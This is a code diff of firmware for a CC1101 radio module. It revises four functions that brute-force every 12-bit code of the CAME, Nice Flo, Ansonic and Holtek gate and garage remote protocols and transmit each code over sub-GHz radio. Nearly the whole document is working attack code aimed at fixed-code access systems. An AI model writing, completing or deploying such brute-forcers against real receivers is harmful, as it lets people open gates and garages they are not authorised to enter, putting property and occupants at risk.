@@ -18,28 +18,26 @@ bool CC1101_BRUTE::Came12BitBrute()
     cc1101.setCC1101Preset(AM650);
     cc1101.loadPreset();
     cc1101.initRaw();
-    encoderState = EncoderStepStart;    
- //   Serial.println(F("Came12BitBrute"));
     int i = 0;
         counter = 0;
 
-    while(i < 4097 ) {
+    while(i < 4095 ) {
     i++;
- //   Serial.println(i);
-    encoderState = EncoderStepStart;
-    while(encoderState != EncoderStepReady){
-    cameProtocol.yield(i);
-    }
 
-    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
-                Serial.println("sending");
-                gpio_set_level(CC1101_CCGDO0A, HIGH);
-                delayMicroseconds(samplesToSend[j]); 
-                gpio_set_level(CC1101_CCGDO0A, LOW);
-                delayMicroseconds(samplesToSend[j+1]);                 
-        }
-            gpio_set_level(CC1101_CCGDO0A, LOW);
- 
+
+    cameProtocol.yield(i);
+
+
+    for(int k = 0; k < repeats; k++) {
+        bool levelFlag = false;
+        for (size_t j = 0; j < samplesToSend.size(); j++) {
+            gpio_set_level(CC1101_CCGDO0A, levelFlag);
+            levelFlag = !levelFlag; 
+            delayMicroseconds(samplesToSend[j]);                
+    }
+    gpio_set_level(CC1101_CCGDO0A, LOW);
+    delayMicroseconds(11520);
+    } 
     counter++;
     }
     sendingFlag = false;
@@ -55,27 +53,28 @@ bool CC1101_BRUTE::Nice12BitBrute()
     cc1101.setCC1101Preset(AM650);
     cc1101.loadPreset();
     cc1101.initRaw();
-    encoderState = EncoderStepStart;    
     int i = 0;
         counter = 0;
 
-    while(i < 4097 ) {
+    while(i < 4095 ) {
     i++;
-    encoderState = EncoderStepStart;
-    while(encoderState != EncoderStepReady){
+
     niceFloProtocol.yield(i);
+
+
+    for(int k = 0; k < repeats; k++) {
+        bool levelFlag = false;
+        for (size_t j = 0; j < samplesToSend.size(); j++) {
+            gpio_set_level(CC1101_CCGDO0A, levelFlag);
+            levelFlag = !levelFlag; 
+            delayMicroseconds(samplesToSend[j]);                
+    }
+    gpio_set_level(CC1101_CCGDO0A, LOW);
+    delayMicroseconds(25200);
     }
 
-    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
-                
-                gpio_set_level(CC1101_CCGDO0A, HIGH);
-                delayMicroseconds(samplesToSend[j]); 
-                gpio_set_level(CC1101_CCGDO0A, LOW);
-                delayMicroseconds(samplesToSend[j+1]);                 
-        }
-            gpio_set_level(CC1101_CCGDO0A, LOW);
     counter++;
-    }
+}
     sendingFlag = false;
    return true;
 }
@@ -93,27 +92,23 @@ bool CC1101_BRUTE::Ansonic12BitBrute()
     int i = 0;
     counter = 0;
 
-    while(i < 4097) {
+    while(i < 4095) {
         i++;
-        encoderState = EncoderStepStart;
-        while(encoderState != EncoderStepReady) {
+
             ansonicProtocol.yield(i);
-            Serial.println("loop");
-        }
 
-        for (size_t j = 0; j < samplesToSend.size(); j += 1) {
-           
-            Serial.println(samplesToSend[j]);
-
-        }
-
-        for (size_t j = 0; j < samplesToSend.size(); j += 2) {
-            gpio_set_level(CC1101_CCGDO0A, HIGH);
-            delayMicroseconds(samplesToSend[j]);
+        
+            for(int k = 0; k < repeats; k++) {
+                bool levelFlag = false;
+                for (size_t j = 0; j < samplesToSend.size(); j++) {
+                    gpio_set_level(CC1101_CCGDO0A, levelFlag);
+                    levelFlag = !levelFlag; 
+                    delayMicroseconds(samplesToSend[j]);                
+            }
             gpio_set_level(CC1101_CCGDO0A, LOW);
-            delayMicroseconds(samplesToSend[j+1]);
-        }
-        gpio_set_level(CC1101_CCGDO0A, LOW);
+            delayMicroseconds(19425);
+            }
+        
         counter++;
     }
     sendingFlag = false;
@@ -135,24 +130,22 @@ bool CC1101_BRUTE::Holtek12BitBrute() {
     int i = 0;
     counter = 0;
     // Brute-force all 12-bit keys (0 .. 4095)
-    while(i < 4096) {
+    while(i < 4095) {
         i++;
-        // Reset the protocol encoder state for each new attempt.
-        encoderState = EncoderStepStart;
-        // Call yield until the protocol’s state machine reaches Ready.
-        while(encoderState != EncoderStepReady) {
+
             holtekProtocol.yield(i);
-            Serial.println("loop");
-        }
-        // Retrieve the generated pulses (upload buffer) and send them.
-        const std::vector<uint32_t>& pulses = holtekProtocol.getSamplesToSend();
-        for(size_t j = 0; j < pulses.size(); j += 2) {
-            gpio_set_level(CC1101_CCGDO0A, HIGH);
-            delayMicroseconds(pulses[j]);
+
+            for(int k = 0; k < repeats; k++) {
+                bool levelFlag = false;
+                for (size_t j = 0; j < samplesToSend.size(); j++) {
+                    gpio_set_level(CC1101_CCGDO0A, levelFlag);
+                    levelFlag = !levelFlag; 
+                    delayMicroseconds(samplesToSend[j]);                
+            }
             gpio_set_level(CC1101_CCGDO0A, LOW);
-            delayMicroseconds(pulses[j+1]);
-        }
-        gpio_set_level(CC1101_CCGDO0A, LOW);
+            delayMicroseconds(14400);    
+            }
+        
         counter++;
     }
     sendingFlag = false;
